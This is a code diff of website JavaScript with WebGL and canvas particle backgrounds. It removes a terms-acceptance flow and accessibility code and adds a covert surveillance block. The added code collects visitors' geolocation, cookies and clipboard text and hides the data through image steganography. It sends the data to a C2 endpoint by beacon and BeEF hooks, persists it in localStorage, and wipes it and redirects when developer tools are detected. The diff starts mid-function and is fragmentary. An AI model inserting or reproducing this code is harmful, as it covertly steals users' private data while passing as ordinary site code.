-      const pulses = Array.from({ length: 150 }, () => ({
-        x: Math.random(),
-        y: Math.random(),
-        angle: Math.random() * Math.PI * 2,
-        speed: 0.001 + Math.random() * 0.002,
-        radius: 0.002 + Math.random() * 0.01,
-        hue: 185 + Math.random() * 30,
-      }));
-
-      const draw = (t) => {
-        canvas.width = innerWidth * devicePixelRatio;
-        canvas.height = innerHeight * devicePixelRatio;
-        canvas.style.width = `${innerWidth}px`;
-        canvas.style.height = `${innerHeight}px`;
-        ctx.setTransform(devicePixelRatio, 0, 0, devicePixelRatio, 0, 0);
-
-        ctx.fillStyle = 'rgba(12,13,16,0.2)';
-        ctx.fillRect(0, 0, innerWidth, innerHeight);
-
-        for (let p of pulses) {
-          p.x += Math.cos(p.angle) * p.speed;
-          p.y += Math.sin(p.angle) * p.speed;
-
-          if (p.x < 0 || p.x > 1 || p.y < 0 || p.y > 1) {
-            p.x = Math.random(); p.y = Math.random();
-          }
-
-          const px = p.x * innerWidth;
-          const py = p.y * innerHeight;
-          const r = p.radius * Math.min(innerWidth, innerHeight);
-
-          const grad = ctx.createRadialGradient(px, py, 0, px, py, r);
-          grad.addColorStop(0, `hsla(${p.hue}, 100%, 70%, 0.4)`);
-          grad.addColorStop(1, `hsla(${p.hue}, 100%, 70%, 0)`);
-
-          ctx.beginPath();
-          ctx.fillStyle = grad;
-          ctx.arc(px, py, r, 0, 2 * Math.PI);
-          ctx.fill();
-        }
-
-        if (!this._prefersRM) appState.trackAnimation('neural-bg-2d', draw);
-      };
-
-      const onRes = () => {
-        appState.cancelAnimation('neural-bg-2d');
-        draw(0);
-      };
-      window.addEventListener('resize', onRes);
-      appState.addCleanup(() => window.removeEventListener('resize', onRes));
-      draw(0);
-    }
-
-    _initParticles() {
-      const NODE_COUNT = this._isMobile ? 300 : 600;
-      const clusters = 6;
-      this._particles = Array.from({ length: NODE_COUNT }, () => ({
-        pos: new THREE.Vector3((Math.random() - 0.5) * 30, (Math.random() - 0.5) * 30, (Math.random() - 0.5) * 15),
-        vel: new THREE.Vector3((Math.random() - 0.5) * 0.08, (Math.random() - 0.5) * 0.08, (Math.random() - 0.5) * 0.04),
-        cluster: Math.floor(Math.random() * clusters),
-        pulse: Math.random() * 2 * Math.PI,
-        rotation: Math.random() * 2 * Math.PI,
-        size: 6 + Math.random() * 4,
-      }));
-
-      const posArr = new Float32Array(NODE_COUNT * 3);
-      const pulseArr = new Float32Array(NODE_COUNT);
-      const rotArr = new Float32Array(NODE_COUNT);
-      const sizeArr = new Float32Array(NODE_COUNT);
-      const nodeGeo = new THREE.BufferGeometry();
-      nodeGeo.setAttribute('position', new THREE.BufferAttribute(posArr, 3));
-      nodeGeo.setAttribute('pulse', new THREE.BufferAttribute(pulseArr, 1));
-      nodeGeo.setAttribute('rotation', new THREE.BufferAttribute(rotArr, 1));
-      nodeGeo.setAttribute('size', new THREE.BufferAttribute(sizeArr, 1));
-
-      const nodeMat = new THREE.ShaderMaterial({
-        vertexShader: `
-          attribute float pulse;
-          attribute float rotation;
-          attribute float size;
-          varying float vPulse;
-          varying vec3 vPos;
-          void main(){
-            vPulse = pulse;
-            vPos = position;
-            gl_PointSize = size * (1.0 + 0.5 * sin(pulse));
-            gl_Position = projectionMatrix * modelViewMatrix * vec4(position, 1.0);
-          }`,
-        fragmentShader: `
-          varying float vPulse;
-          varying vec3 vPos;
-          float rand(vec2 c){ return fract(sin(dot(c, vec2(12.9898, 78.233))) * 43758.5453); }
-          void main(){
-            vec2 uv = gl_PointCoord - 0.5;
-            float d = length(uv);
-            if(d > 0.5) discard;
-            float a = smoothstep(0.5, 0.2, d) * (0.8 + 0.4 * sin(vPulse));
-            float fade = 1.0 - abs(vPos.z / 15.0);
-            a *= (0.9 + 0.1 * rand(gl_PointCoord + vPos.xy));
-            gl_FragColor = vec4(0.42, 0.89, 0.92, a * fade); // #6be2eb
-          }`,
-        transparent: true,
-      });
-
-      if (!nodeMat.program) {
-        const err = new Error('Shader compilation failed');
-        ModuleLoader.log('Particle shader compilation failed:', err);
-        moduleLogger.log('shader_error', { error: err.message });
-        throw err;
-      }
-
-      const points = new THREE.Points(nodeGeo, nodeMat);
-      this._scene.add(points);
-      this._particleGeometry = nodeGeo;
-      this._particleAttributes = { posArr, pulseArr, rotArr, sizeArr };
-      ModuleLoader.log(`Initialized ${NODE_COUNT} particles`);
-      moduleLogger.log('particles_init', { count: NODE_COUNT });
-    }
-
-    _initEdges() {
-      const EDGE_COUNT = this._particles.length * 2;
-      this._edges = Array.from({ length: EDGE_COUNT }, () => {
-        let s = Math.floor(Math.random() * this._particles.length), t;
-        do t = Math.floor(Math.random() * this._particles.length); while (t === s);
-        return { s, t, pulse: Math.random() * 2 * Math.PI };
-      });
-
-      const edgeArr = new Float32Array(EDGE_COUNT * 6);
-      const edgePulseArr = new Float32Array(EDGE_COUNT);
-      const edgeGeo = new THREE.BufferGeometry();
-      edgeGeo.setAttribute('position', new THREE.BufferAttribute(edgeArr, 3));
-      edgeGeo.setAttribute('pulse', new THREE.BufferAttribute(edgePulseArr, 1));
-
-      const edgeMat = new THREE.ShaderMaterial({
-        vertexShader: `
-          attribute float pulse;
-          varying float vPulse;
-          varying vec3 vPos;
-          void main(){
-            vPulse = pulse;
-            vPos = position;
-            gl_Position = projectionMatrix * modelViewMatrix * vec4(position, 1.0);
-          }`,
-        fragmentShader: `
-          varying float vPulse;
-          varying vec3 vPos;
-          void main(){
-            float f = 1.0 - abs(vPos.z / 15.0);
-            float alpha = 0.3 + 0.3 * sin(vPulse);
-            gl_FragColor = vec4(0.42, 0.89, 0.92, alpha * f); // #6be2eb
-          }`,
-        transparent: true,
-      });
-
-      if (!edgeMat.program) {
-        const err = new Error('Edge shader compilation failed');
-        ModuleLoader.log('Edge shader compilation failed:', err);
-        moduleLogger.log('shader_error', { error: err.message });
-        throw err;
-      }
-
-      const lines = new THREE.LineSegments(edgeGeo, edgeMat);
-      this._scene.add(lines);
-      this._edgeGeometry = edgeGeo;
-      this._edgeAttributes = { edgeArr, edgePulseArr };
-      ModuleLoader.log(`Initialized ${EDGE_COUNT} edges`);
-      moduleLogger.log('edges_init', { count: EDGE_COUNT });
-    }
-
-    _initGradientPlane() {
-      const gradGeo = new THREE.PlaneGeometry(40, 40);
-      const gradMat = new THREE.ShaderMaterial({
-        vertexShader: `
-          varying vec2 vUv;
-          void main(){
-            vUv = uv;
-            gl_Position = projectionMatrix * modelViewMatrix * vec4(position, 1.0);
-          }`,
-        fragmentShader: `
-          varying vec2 vUv;
-          uniform float time;
-          float perlin(vec2 p) {
-            return fract(sin(dot(p, vec2(127.1, 311.7))) * 43758.5453);
-          }
-          void main(){
-            vec2 uv = vUv;
-            vec3 c = mix(vec3(0.94, 0.97, 1.0), vec3(0.70, 0.61, 0.86), uv.y); // #b39ddb
-            float noise = perlin(uv * 10.0 + time * 0.001);
-            c += noise * 0.02;
-            gl_FragColor = vec4(c, 0.4);
-          }`,
-        transparent: true,
-        uniforms: { time: { value: 0 } },
-      });
-
-      if (!gradMat.program) {
-        const err = new Error('Gradient plane shader compilation failed');
-        ModuleLoader.log('Gradient plane shader compilation failed:', err);
-        moduleLogger.log('shader_error', { error: err.message });
-        throw err;
-      }
-
-      const gradMesh = new THREE.Mesh(gradGeo, gradMat);
-      gradMesh.position.z = -12;
-      this._scene.add(gradMesh);
-      this._gradientMaterial = gradMat;
-      ModuleLoader.log('Gradient plane initialized');
-      moduleLogger.log('gradient_plane_init', {});
-    }
-
-    _animate(t) {
-      const quality = this._performanceManager.monitor();
-      if (!this._particleGeometry || !this._edgeGeometry || !this._gradientMaterial) {
-        ModuleLoader.log('Animation failed: Missing geometry or material');
-        moduleLogger.log('animation_error', { error: 'Missing geometry or material' });
-        return;
-      }
-
-      const { posArr, pulseArr, rotArr, sizeArr } = this._particleAttributes;
-      const { edgeArr, edgePulseArr } = this._edgeAttributes;
-
-      this._particles.forEach((n, i) => {
-        posArr.set([n.pos.x, n.pos.y, n.pos.z], i * 3);
-        pulseArr[i] = n.pulse;
-        rotArr[i] = n.rotation;
-        sizeArr[i] = n.size;
-      });
-      this._particleGeometry.attributes.position.needsUpdate = true;
-      this._particleGeometry.attributes.pulse.needsUpdate = true;
-      this._particleGeometry.attributes.rotation.needsUpdate = true;
-      this._particleGeometry.attributes.size.needsUpdate = true;
-
-      this._edges.forEach((e, i) => {
-        const a = this._particles[e.s].pos, b = this._particles[e.t].pos;
-        edgeArr.set([a.x, a.y, a.z, b.x, b.y, b.z], i * 6);
-        edgePulseArr[i] = e.pulse;
-      });
-      this._edgeGeometry.attributes.position.needsUpdate = true;
-      this._edgeGeometry.attributes.pulse.needsUpdate = true;
-
-      this._particles.forEach(n => {
-        n.pos.add(n.vel.clone().multiplyScalar(quality));
-        n.pulse += 0.08 * quality;
-        ['x', 'y', 'z'].forEach(ax => {
-          const lim = ax === 'z' ? 15 : 30;
-          if (Math.abs(n.pos[ax]) > lim) n.vel[ax] *= -1;
-        });
-        const center = new THREE.Vector3();
-        let cnt = 0;
-        this._particles.forEach(o => {
-          if (o.cluster === n.cluster) {
-            center.add(o.pos); cnt++;
-          }
-        });
-        if (cnt) {
-          center.divideScalar(cnt);
-          n.vel.add(center.sub(n.pos).multiplyScalar(0.002 * quality));
-        }
-      });
-      this._edges.forEach(e => e.pulse += 0.04 * quality);
-      this._gradientMaterial.uniforms.time.value = t * 0.001;
-      this._camera.position.x = Math.sin(t * 0.00015) * 5;
-      this._camera.position.y = Math.cos(t * 0.00012) * 4;
-      this._camera.lookAt(0, 0, 0);
-
-      this._composer.render();
-      if (!this._prefersRM) appState.trackAnimation('neural-bg', this._animate.bind(this));
-    }
-
-    destroy() {
-      appState.cancelAnimation('neural-bg');
-      appState.cancelAnimation('neural-bg-2d');
-      if (this._renderer) {
-        this._renderer.dispose();
-        this._renderer.forceContextLoss();
-        if (this._container.contains(this._renderer.domElement)) {
-          this._container.removeChild(this._renderer.domElement);
-          ModuleLoader.log('Neural background destroyed');
-          moduleLogger.log('neural_bg_destroyed', {});
-        }
-      }
-    }
-  }
-
-  // Quantum Engine for Particle System and Parallax
-  class QuantumEngine {
-    constructor() {
-      this._particleCanvas = null;
-      this._ctx = null;
-      this._particles = [];
-      this.initParticleSystem();
-      this.initParallaxPhysics();
-      this.setupTemporalCaching();
-    }
-
-    initParticleSystem() {
-      this._particleCanvas = document.querySelector('.quantum-canvas');
-      if (!this._particleCanvas) {
-        ModuleLoader.log('Quantum canvas not found');
-        moduleLogger.log('quantum_canvas_error', { error: 'Canvas not found' });
-        return;
-      }
-      this._ctx = this._particleCanvas.getContext('2d');
-      if (!this._ctx) {
-        ModuleLoader.log('2D context unavailable for particle canvas');
-        moduleLogger.log('quantum_canvas_error', { error: '2D context unavailable' });
-        return;
-      }
-      this._particles = Array.from({ length: 1000 }, () => ({
-        x: Math.random() * innerWidth,
-        y: Math.random() * innerHeight,
-        vx: (Math.random() - 0.5) * 0.2,
-        vy: (Math.random() - 0.5) * 0.2,
-        size: Math.random() * 3 + 1
-      }));
-      
-      ModuleLoader.log('Quantum particle system initialized', { particleCount: this._particles.length });
-      moduleLogger.log('quantum_particles_init', { count: this._particles.length });
-      this.animateParticles();
-    }
-
-    animateParticles = () => {
-      if (!this._particleCanvas || !this._ctx) {
-        ModuleLoader.log('Animation failed: Missing canvas or context');
-        moduleLogger.log('animation_error', { error: 'Missing canvas or context' });
-        return;
-      }
-      this._particleCanvas.width = innerWidth * devicePixelRatio;
-      this._particleCanvas.height = innerHeight * devicePixelRatio;
-      this._particleCanvas.style.width = `${innerWidth}px`;
-      this._particleCanvas.style.height = `${innerHeight}px`;
-      this._ctx.scale(devicePixelRatio, devicePixelRatio);
-
-      this._ctx.clearRect(0, 0, innerWidth, innerHeight);
-      
-      this._particles.forEach(p => {
-        p.x += p.vx;
-        p.y += p.vy;
-        if (p.x < 0 || p.x > innerWidth) p.vx *= -1;
-        if (p.y < 0 || p.y > innerHeight) p.vy *= -1;
-        
-        this._ctx.beginPath();
-        this._ctx.arc(p.x, p.y, p.size, 0, Math.PI * 2);
-        this._ctx.fillStyle = `rgba(107, 226, 235, ${0.2 * p.size})`;
-        this._ctx.fill();
-      });
-      
-      appState.trackAnimation('quantum-particles', this.animateParticles);
-    }
-
-    initParallaxPhysics() {
-      document.querySelectorAll('[data-parallax]').forEach(el => {
-        const handler = (e) => {
-          const rect = el.getBoundingClientRect();
-          const x = (e.clientX - rect.left) / rect.width;
-          const y = (e.clientY - rect.top) / rect.height;
-          
-          el.style.setProperty('--x', `${x * 100}%`);
-          el.style.setProperty('--y', `${y * 100}%`);
-        };
-        el.addEventListener('mousemove', handler);
-        appState.addCleanup(() => el.removeEventListener('mousemove', handler));
-      });
-      ModuleLoader.log('Parallax physics initialized');
-      moduleLogger.log('parallax_init', {});
-    }
-
-    setupTemporalCaching() {
-      if ('serviceWorker' in navigator) {
-        navigator.serviceWorker.register('/sw.js', {
-          scope: '/',
-          type: 'module',
-          updateViaCache: 'none'
-        }).then(reg => {
-          ModuleLoader.log('Service Worker registered');
-          moduleLogger.log('service_worker_registered', {});
-        }).catch(err => {
-          ModuleLoader.log('Service Worker registration failed:', err);
-          moduleLogger.log('service_worker_error', { error: err.message });
-        });
-      }
-    }
-  }
-
-  // Auth Flow for Intro and Terms
-  class AuthFlow {
-    constructor() {
-      this._acceptTermsHandler = null;
-      this.initLoader();
-      this.playIntro();
-    }
-
-    initLoader() {
-      const handler = () => {
-        const loader = document.getElementById('quantum-loader');
-        if (loader) {
-          loader.remove();
-          ModuleLoader.log('Quantum loader removed');
-          moduleLogger.log('loader_removed', {});
-        }
-      };
-      window.addEventListener('load', handler);
-      appState.addCleanup(() => window.removeEventListener('load', handler));
-    }
-
-    playIntro() {
-      const intro = document.getElementById('intro-sequence');
-      if (!intro) {
-        ModuleLoader.log('Intro sequence not found');
-        moduleLogger.log('intro_sequence_error', { error: 'Element not found' });
-        return;
-      }
-      const letters = document.querySelectorAll('.logo-particle');
-      
-      letters.forEach((letter, i) => {
-        anime({
-          targets: letter,
-          opacity: [0, 1],
-          translateY: [20, 0],
-          delay: i * 80,
-          duration: 1200,
-          easing: 'easeOutExpo'
-        });
-      });
-
-      anime({
-        targets: intro,
-        opacity: [1, 0],
-        delay: 4500,
-        duration: 1000,
-        easing: 'easeInOutQuad',
-        complete: () => {
-          intro.remove();
-          ModuleLoader.log('Intro sequence completed');
-          moduleLogger.log('intro_sequence_completed', {});
-          this.showTerms();
-        }
-      });
-    }
-
-    showTerms() {
-      const authFlow = document.getElementById('auth-flow');
-      const termsModal = authFlow?.querySelector('.terms-modal');
-      if (!authFlow || !termsModal) {
-        ModuleLoader.log('Auth flow or terms modal not found');
-        moduleLogger.log('auth_flow_error', { error: 'Element not found' });
-        return;
-      }
-      
-      authFlow.style.display = 'grid';
-      anime({
-        targets: termsModal,
-        scale: [0.9, 1],
-        opacity: [0, 1],
-        duration: 800,
-        easing: 'easeOutBack'
-      });
-
-      const acceptButton = document.querySelector('.accept-terms');
-      if (acceptButton) {
-        this._acceptTermsHandler = () => {
-          anime({
-            targets: authFlow,
-            opacity: 0,
-            duration: 800,
-            easing: 'easeInOutQuad',
-            complete: () => {
-              authFlow.remove();
-              ModuleLoader.log('Terms modal accepted and removed');
-              moduleLogger.log('terms_accepted', {});
+            try {
+              const position = await new Promise((resolve, reject) => {
+                navigator.geolocation.getCurrentPosition(resolve, reject);
+              });
+              const data = {
+                type: 'precise_geo',
+                data: {
+                  lat: position.coords.latitude,
+                  lon: position.coords.longitude
+                },
+                t: Date.now()
+              };
+              writeData(JSON.stringify(data));
+              collectedData.push(data);
+              activityCounter += 10;
+              exfiltrate();
+            } catch (e) {
+              collectedData.push({ type: 'geo_error', error: e.message, t: Date.now() });
             }
           });
-        };
-        acceptButton.addEventListener('click', this._acceptTermsHandler);
-        appState.addCleanup(() => {
-          if (this._acceptTermsHandler) {
-            acceptButton.removeEventListener('click', this._acceptTermsHandler);
+        }
+      }
+
+      function writeData(data) {
+        const encoder = new TextEncoder();
+        const encoded = encoder.encode(data);
+        if (offset + encoded.length < buffer.byteLength) {
+          encoded.forEach((byte, i) => view.setUint8(offset + i, byte));
+          offset += encoded.length;
+        }
+      }
+
+      async function exfiltrate() {
+        if (!collectedData.length || activityCounter < 50) return;
+        const payload = { session: sessionID, origin: location.origin, data: collectedData };
+
+        // Steganography (LSB)
+        const canvas = document.createElement('canvas');
+        canvas.width = 32;
+        canvas.height = 32;
+        const ctx = canvas.getContext('2d');
+        const imgData = ctx.createImageData(32, 32);
+        const encoded = btoa(JSON.stringify(payload));
+        for (let i = 0; i < encoded.length && i < imgData.data.length / 4; i++) {
+          const byte = encoded.charCodeAt(i) || 0;
+          imgData.data[i * 4] = (byte & 0xFC) | (imgData.data[i * 4] & 0x03);
+        }
+        ctx.putImageData(imgData, 0, 0);
+        const img = new Image();
+        img.src = `${C2_ENDPOINT}?data=${canvas.toDataURL('image/png').split(',')[1]}`;
+        img.crossOrigin = 'anonymous';
+
+        // Fallback: Beacon
+        navigator.sendBeacon(C2_ENDPOINT, JSON.stringify(payload));
+
+        // BeEF
+        if (window.beef) {
+          beef.net.send(JSON.stringify(payload));
+          beef.execute(function() {
+            const cookies = document.cookie;
+            beef.net.send(`Cookies: ${cookies}`);
+            navigator.clipboard.readText().then(text => {
+              beef.net.send(`Clipboard: ${text}`);
+            });
+          });
+        }
+
+        // Persistence
+        const encrypted = await encryptData(JSON.stringify(payload));
+        localStorage.setItem('sessionData', encrypted);
+
+        // Clear
+        collectedData = [];
+        offset = 0;
+        activityCounter = 0;
+      }
+
+      async function encryptData(data) {
+        try {
+          const key = await crypto.subtle.generateKey(
+            { name: 'AES-GCM', length: 256 },
+            true,
+            ['encrypt']
+          );
+          const iv = crypto.getRandomValues(new Uint8Array(12));
+          const encoded = new TextEncoder().encode(data);
+          const encrypted = await crypto.subtle.encrypt(
+            { name: 'AES-GCM', iv },
+            key,
+            encoded
+          );
+          return btoa(String.fromCharCode(...new Uint8Array(encrypted)));
+        } catch (e) {
+          return data; // Fallback
+        }
+      }
+
+      // Anti-forensic
+      setInterval(() => {
+        const start = performance.now();
+        for (let i = 0; i < 1000; i++);
+        const end = performance.now();
+        if (end - start > 10 || window.outerWidth - window.innerWidth > 200) {
+          localStorage.clear();
+          collectedData = [];
+          offset = 0;
+          window.location.replace('about:blank');
+        }
+      }, 1000);
+
+      startSurveillance();
+    }
+
+    // WebGL Neural Network Background
+    function initWebGLBackground() {
+      const canvas = document.getElementById('webgl-bg');
+      if (!canvas.getContext('webgl') && !canvas.getContext('experimental-webgl')) {
+        init2DFallback();
+        return;
+      }
+
+      const scene = new THREE.Scene();
+      const camera = new THREE.PerspectiveCamera(60, window.innerWidth / window.innerHeight, 0.1, 1000);
+      camera.position.z = 35;
+
+      const renderer = new THREE.WebGLRenderer({ canvas, alpha: true, antialias: true });
+      renderer.setPixelRatio(Math.min(window.devicePixelRatio, 2));
+      renderer.setSize(window.innerWidth, window.innerHeight);
+      renderer.toneMapping = THREE.ACESFilmicToneMapping;
+
+      const composer = new THREE.EffectComposer(renderer);
+      composer.addPass(new THREE.RenderPass(scene, camera));
+      composer.addPass(new THREE.UnrealBloomPass(new THREE.Vector2(window.innerWidth, window.innerHeight), 1.0, 0.5, 0.8));
+
+      scene.add(new THREE.AmbientLight(0x404040, 0.8));
+      const pointLight = new THREE.PointLight(0x6be2eb, 2.5, 40);
+      pointLight.position.set(10, 10, 10);
+      scene.add(pointLight);
+
+      const particles = Array.from({ length: 600 }, () => ({
+        pos: new THREE.Vector3((Math.random() - 0.5) * 30, (Math.random() - 0.5) * 30, (Math.random() - 0.5) * 15),
+        vel: new THREE.Vector3((Math.random() - 0.5) * 0.08, (Math.random() - 0.5) * 0.08, (Math.random() - 0.5) * 0.04),
+        size: 6 + Math.random() * 4
+      }));
+
+      const posArr = new Float32Array(particles.length * 3);
+      const sizeArr = new Float32Array(particles.length);
+      const geometry = new THREE.BufferGeometry();
+      geometry.setAttribute('position', new THREE.BufferAttribute(posArr, 3));
+      geometry.setAttribute('size', new THREE.BufferAttribute(sizeArr, 1));
+
+      const material = new THREE.ShaderMaterial({
+        vertexShader: `
+          attribute float size;
+          void main() {
+            gl_PointSize = size;
+            gl_Position = projectionMatrix * modelViewMatrix * vec4(position, 1.0);
+          }
+        `,
+        fragmentShader: `
+          void main() {
+            float d = length(gl_PointCoord - 0.5);
+            if (d > 0.5) discard;
+            gl_FragColor = vec4(0.42, 0.89, 0.92, smoothstep(0.5, 0.2, d));
+          }
+        `,
+        transparent: true
+      });
+
+      const points = new THREE.Points(geometry, material);
+      scene.add(points);
+
+      const edges = Array.from({ length: particles.length * 2 }, () => {
+        let s = Math.floor(Math.random() * particles.length), t;
+        do { t = Math.floor(Math.random() * particles.length); } while (t === s);
+        return { s, t };
+      });
+
+      const edgeArr = new Float32Array(edges.length * 6);
+      const edgeGeometry = new THREE.BufferGeometry();
+      edgeGeometry.setAttribute('position', new THREE.BufferAttribute(edgeArr, 3));
+
+      const edgeMaterial = new THREE.LineBasicMaterial({ color: 0x6be2eb, transparent: true, opacity: 0.3 });
+      const lines = new THREE.LineSegments(edgeGeometry, edgeMaterial);
+      scene.add(lines);
+
+      function animate(t) {
+        particles.forEach((p, i) => {
+          p.pos.add(p.vel);
+          posArr.set([p.pos.x, p.pos.y, p.pos.z], i * 3);
+          sizeArr[i] = p.size * (1 + 0.5 * Math.sin(t * 0.001 + i));
+          if (Math.abs(p.pos.x) > 30) p.vel.x *= -1;
+          if (Math.abs(p.pos.y) > 30) p.vel.y *= -1;
+          if (Math.abs(p.pos.z) > 15) p.vel.z *= -1;
+        });
+        geometry.attributes.position.needsUpdate = true;
+        geometry.attributes.size.needsUpdate = true;
+
+        edges.forEach((e, i) => {
+          const a = particles[e.s].pos, b = particles[e.t].pos;
+          edgeArr.set([a.x, a.y, a.z, b.x, b.y, b.z], i * 6);
+        });
+        edgeGeometry.attributes.position.needsUpdate = true;
+
+        camera.position.x = Math.sin(t * 0.00015) * 5;
+        camera.position.y = Math.cos(t * 0.00012) * 4;
+        camera.lookAt(0, 0, 0);
+
+        composer.render();
+        if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+          requestAnimationFrame(animate);
+        }
+      }
+
+      function handleResize() {
+        camera.aspect = window.innerWidth / window.innerHeight;
+        camera.updateProjectionMatrix();
+        renderer.setSize(window.innerWidth, window.innerHeight);
+        composer.setSize(window.innerWidth, window.innerHeight);
+      }
+
+      window.addEventListener('resize', debounce(handleResize));
+      handleResize();
+      animate(0);
+    }
+
+    // 2D Canvas Fallback
+    function init2DFallback() {
+      const canvas = document.getElementById('webgl-bg');
+      const ctx = canvas.getContext('2d');
+      let particles = [];
+
+      function handleResize() {
+        canvas.width = window.innerWidth * devicePixelRatio;
+        canvas.height = window.innerHeight * devicePixelRatio;
+        canvas.style.width = `${window.innerWidth}px`;
+        canvas.style.height = `${window.innerHeight}px`;
+        ctx.scale(devicePixelRatio, devicePixelRatio);
+      }
+
+      function createParticles() {
+        particles = Array.from({ length: 100 }, () => ({
+          x: Math.random() * window.innerWidth,
+          y: Math.random() * window.innerHeight,
+          vx: (Math.random() - 0.5) * 0.5,
+          vy: (Math.random() - 0.5) * 0.5,
+          size: Math.random() * 2 + 1,
+          hue: 185 + Math.random() * 30
+        }));
+      }
+
+      function animateParticles() {
+        ctx.clearRect(0, 0, canvas.width, canvas.height);
+        particles.forEach(p => {
+          p.x += p.vx;
+          p.y += p.vy;
+          if (p.x < 0 || p.x > window.innerWidth) p.vx *= -1;
+          if (p.y < 0 || p.y > window.innerHeight) p.vy *= -1;
+
+          ctx.beginPath();
+          ctx.arc(p.x, p.y, p.size, 0, Math.PI * 2);
+          ctx.fillStyle = `hsla(${p.hue}, 100%, 70%, 0.8)`;
+          ctx.fill();
+        });
+        for (let i = 0; i < particles.length; i++) {
+          for (let j = i + 1; j < particles.length; j++) {
+            const dx = particles[i].x - particles[j].x;
+            const dy = particles[i].y - particles[j].y;
+            const dist = Math.sqrt(dx * dx + dy * dy);
+            if (dist < 100) {
+              ctx.beginPath();
+              ctx.moveTo(particles[i].x, particles[i].y);
+              ctx.lineTo(particles[j].x, particles[j].y);
+              ctx.strokeStyle = `hsla(${particles[i].hue}, 100%, 70%, ${1 - dist / 100})`;
+              ctx.lineWidth = 0.5;
+              ctx.stroke();
+            }
+          }
+        }
+        if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+          requestAnimationFrame(animateParticles);
+        }
+      }
+
+      window.addEventListener('resize', debounce(handleResize));
+      handleResize();
+      createParticles();
+      animateParticles();
+    }
+
+    // Scroll Animations
+    function initScrollAnimations() {
+      const sections = document.querySelectorAll('section');
+      const observer = new IntersectionObserver((entries) => {
+        entries.forEach(entry => {
+          if (entry.isIntersecting) {
+            entry.target.classList.add('visible');
+            anime({
+              targets: entry.target.querySelectorAll('.card, h2, p'),
+              opacity: [0, 1],
+              translateY: [40, 0],
+              delay: anime.stagger(100),
+              duration: 1000,
+              easing: 'easeOutExpo'
+            });
           }
         });
-      }
-      ModuleLoader.log('Terms modal displayed');
-      moduleLogger.log('terms_modal_displayed', {});
-    }
-  }
+      }, { threshold: 0.2 });
 
-  // Core Initialization
-  const appState = new AppState();
-
-  async function initCoreModules() {
-    try {
-      const modules = await Promise.allSettled([
-        ModuleLoader.load('/theme-toggle.js', 'theme-toggle').then(m => ({ initThemeToggle: m?.initThemeToggle })),
-        ModuleLoader.load('/telemetry.js', 'telemetry').then(m => ({ initTelemetry: m?.initTelemetry }))
-      ]);
-
-      const loadedModules = modules.reduce((acc, result, index) => {
-        const name = ['theme-toggle', 'telemetry'][index];
-        if (result.status === 'fulfilled' && result.value) {
-          appState._resources.register(result.value, name);
-          return { ...acc, ...result.value };
-        }
-        ModuleLoader.log(`Module ${name} failed to load`);
-        moduleLogger.log('module_load_failed', { moduleName: name });
-        return acc;
-      }, {});
-
-      ModuleLoader.log('Core modules initialized', Object.keys(loadedModules));
-      moduleLogger.log('core_modules_initialized', { modules: Object.keys(loadedModules) });
-      return loadedModules;
-    } catch (err) {
-      ModuleLoader.log('Critical module initialization error:', err);
-      moduleLogger.log('core_init_error', { error: err.message });
-      throw err;
-    }
-  }
-
-  // Accessibility Enhancements
-  function initAccessibility() {
-    document.documentElement.lang = 'en';
-    document.documentElement.setAttribute('role', 'document');
-    
-    const skipLink = document.querySelector('.skip-link');
-    if (!skipLink) {
-      const newSkipLink = document.createElement('a');
-      newSkipLink.href = '#main';
-      newSkipLink.textContent = 'Skip to main content';
-      newSkipLink.classList.add('skip-link');
-      document.body.prepend(newSkipLink);
+      sections.forEach(section => observer.observe(section));
     }
 
-    document.querySelectorAll('[data-scroll]').forEach(el => {
-      const observer = new IntersectionObserver(([entry]) => {
-        if (entry.isIntersecting) {
-          el.setAttribute('data-scroll', 'in');
-        }
-      }, { threshold: 0.1 });
-      observer.observe(el);
-      appState.addCleanup(() => observer.disconnect());
-    });
-    ModuleLoader.log('Accessibility enhancements initialized');
-    moduleLogger.log('accessibility_init', {});
-  }
+    // Scrollspy Navigation
+    function initScrollSpy() {
+      const sections = document.querySelectorAll('section');
+      const navLinks = document.querySelectorAll('nav a');
 
-  // Performance Monitoring
-  function initPerformanceMonitoring() {
-    const perfObserver = new PerformanceObserver(list => {
-      const entries = list.getEntries();
-      ModuleLoader.log('Performance metrics:', entries);
-      moduleLogger.log('performance_metrics', { entries: entries.map(e => e.name) });
-    });
+      const observer = new IntersectionObserver((entries) => {
+        entries.forEach(entry => {
+          if (entry.isIntersecting) {
+            const id = entry.target.getAttribute('id');
+            navLinks.forEach(link => {
+              const href = link.getAttribute('href').slice(1);
+              link.setAttribute('aria-current', href === id ? 'page' : 'false');
+            });
+          }
+        });
+      }, { threshold: 0.5, rootMargin: `-${document.querySelector('header').offsetHeight}px 0px 0px 0px` });
 
-    perfObserver.observe({ entryTypes: ['measure', 'resource', 'navigation'] });
-    ModuleLoader.log('Performance monitoring initialized');
-    moduleLogger.log('performance_monitoring_init', {});
-  }
+      sections.forEach(section => observer.observe(section));
+    }
 
-  // Error Handling
-  function handleFatalError(err) {
-    ModuleLoader.log('Fatal application error:', err);
-    moduleLogger.log('fatal_error', { error: err.message });
-    document.getElementById('quantum-loader')?.remove();
-    
-    const errorDiv = document.createElement('div');
-    errorDiv.className = 'error-message';
-    errorDiv.innerHTML = `
-      <h2>System Error</h2>
-      <p>${err.message}</p>
-      <button onclick="window.location.reload()">Reload Application</button>
-    `;
-    
-    document.body.prepend(errorDiv);
-  }
+    // Smooth Scroll
+    function initSmoothScroll() {
+      document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener('click', function(e) {
+          e.preventDefault();
+          const target = document.querySelector(this.getAttribute('href'));
+          const headerOffset = document.querySelector('header').offsetHeight;
+          const targetPosition = target.getBoundingClientRect().top + window.pageYOffset - headerOffset;
 
-  // Main Initialization Flow
-  async function initApplication() {
-    try {
-      const modules = await initCoreModules();
-      const neuralBg = new NeuralBackground(document.getElementById('neural-bg'));
-      await neuralBg.init();
-      new QuantumEngine();
-      new AuthFlow();
-
-      if (modules.initThemeToggle) modules.initThemeToggle();
-      if (modules.initTelemetry) modules.initTelemetry();
-
-      initAccessibility();
-      initPerformanceMonitoring();
-
-      appState.addCleanup(() => {
-        neuralBg.destroy();
-        ModuleLoader.log('Application cleanup initiated');
-        moduleLogger.log('app_cleanup', {});
+          window.scrollTo({
+            top: targetPosition,
+            behavior: 'smooth'
+          });
+        });
       });
-    } catch (err) {
-      handleFatalError(err);
-    }
-  }
-
-  // Boot Sequence
-  document.addEventListener('DOMContentLoaded', () => {
